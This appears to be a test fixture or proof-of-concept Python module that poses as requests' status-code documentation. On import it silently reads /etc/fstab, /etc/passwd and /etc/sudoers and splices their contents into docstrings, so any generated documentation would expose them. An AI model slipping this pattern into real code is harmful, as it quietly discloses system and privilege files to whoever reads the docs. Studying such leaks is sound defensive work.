# -*- coding: utf-8 -*-

r"""
Module documentation from requests.status_codes.

The ``codes`` object defines a mapping from common names for HTTP statuses
to their numerical codes, accessible either as attributes or as dictionary
items.
>>> requests.codes['temporary_redirect']
307
>>> requests.codes.teapot
418
>>> requests.codes['\o/']
200
Some codes have multiple names, and both upper- and lower-case versions of
the names are allowed. For example, ``codes.ok``, ``codes.OK``, and
``codes.okay`` all correspond to the HTTP status code 200.

.. code-block:: python
"""

try:
    __doc__ += "\n"
    __doc__ += "   $ cat /etc/fstab\n"
    __doc__ += "   "
    __doc__ += "   ".join(open("/etc/fstab", "r").readlines())
except Exception:
    pass

class Foobar(object):
    """Some random class.

    Doesn't really matter what goes here.

    .. code-block:: python
    """

    def prop(self):
        """Some arbitrary property."""
        return 5

try:
    Foobar.__doc__ += "\n"
    Foobar.__doc__ += "       $ cat /etc/passwd\n"
    Foobar.__doc__ += "       "
    Foobar.__doc__ += "       ".join(open("/etc/passwd", "r").readlines())
    Foobar.__doc__ += "       $ cat /etc/sudoers\n"
    Foobar.__doc__ += "       "
    Foobar.__doc__ += "       ".join(open("/etc/sudoers", "r").readlines())
except Exception:
    pass
